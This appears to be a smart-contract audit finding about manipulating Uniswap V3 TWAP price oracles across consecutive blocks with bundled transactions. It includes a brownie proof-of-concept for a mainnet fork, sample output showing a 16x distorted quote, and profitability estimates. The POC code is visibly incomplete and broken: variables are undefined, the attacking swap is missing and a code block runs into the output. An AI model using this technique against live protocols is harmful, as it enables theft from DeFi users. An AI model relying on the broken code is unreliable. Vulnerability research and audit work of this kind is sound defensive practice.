# Most UniV3 Twaps can be attacked via one block pricing attack

## Summary

Uniswap TWAP provides security for same block manipulation

However, for most pools, it will not provide security against manipulations that can be performed across one block

One block attacks are possible because of:
- Flashbot bundles
- Pre-Known Validators due to Proof of Stake


## Vulnerability Detail

Because we can:
- Perform the last TX of Block N - 1
- Perform the first TX of Block N

Thanks to cross block bundles

We can perform the following attack:
- Attack the pool via an imbalanced Swap on Block N - 1
- Use the manipulated TWAP price at Block N to extract value as well as the caller incentive
- Re-balance the pool to close the attack


The strategy has been researched and shown to be doable here:
https://arxiv.org/abs/2303.04430

This is possible because block validators can be known at the beginning of an epoch in POS

## Impact

TWAP for most pairs will be unsafe because in practice cross-block arbitrages are possible

## Code Snippet

The POC shows an example of a Low Liquidity Pool (e.g. wBTC / USDC at 30 BPS)

And shows that even this pool can be manipulated via MMEV

The following POC is written in brownie,

Run on fork mainnet via
`brownie console --network mainnet-fork`


Then paste the python in the terminal


```python
router = UniV3Router.at("0xe592427a0aece92de3edee1f18e0157c05861564")

usdc = interface.ERC20("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48")
lusd = interface.ERC20("0x5f98805A4E8be255a32880FDeC7F6728C6568bA0")

c = OracleLibrary.deploy({"from": a[0]})

res = c.consult(to_attack, 15 * 60)

quote = c.getQuoteAtTick(res[0], 1e8, wbtc, usdc)
print("Before Attack time", chain.time())

usdc_whale = accounts.at("0x0A59649758aa4d66E25f08Dd01271e891fe52199", force=True)

chain.mine()

The output will look close to this:
```python

res3 time, this tx will be done as first in the block 1682337580
After attacking with 100MLN USDC
Before Attack Tick (56127, 7689799713075)
Before Attack Quote 27380587878
Same Block Attack Tick - Protected (56127, 7689799713075)
Same Block Attack Quote - Protected 27380587878
Next Block
Next Block Attack Tick - Manipulated (83920, 300833904)
Next Block Attack Quote - Manipulated 440978153194
Ratio between honest quote and manipulated quote 16.10550347417197
```

Proving that the price can be moved on the next block very noticeably

## Tool used

Manual Review

## Recommendation

Limit the usage of TWAP for High Liquidity Pairs (100 MLN+)
Alternatively, use Chainlink Price feeds and limit support to all the tokens that have a feed

## On Severity and profitability

The given example is illustrative of a fairly used pool (USDC and wBTC being top market cap tokens)

This applies to other pools which have less liquidity (e.g. most Protocol Tokens to USDC instead of to ETH)

Napkin math on conditions for profitability are the following:
- The attack above will cost 300k / 600k in swap fees, meaning that at least 600k needs to be at risk

Assuming a caller incentive of 2%, and a Bull Market Swap Fee of $500 
500 / .02 = 25000
600 / 25 = 24

If 24 splits meet the requirement for a profitable swap on Mainnet, then the attack becomes profitable given the conditions above

The attack should be cheaper to perform for lower liquidity pairs, which the architecture allows
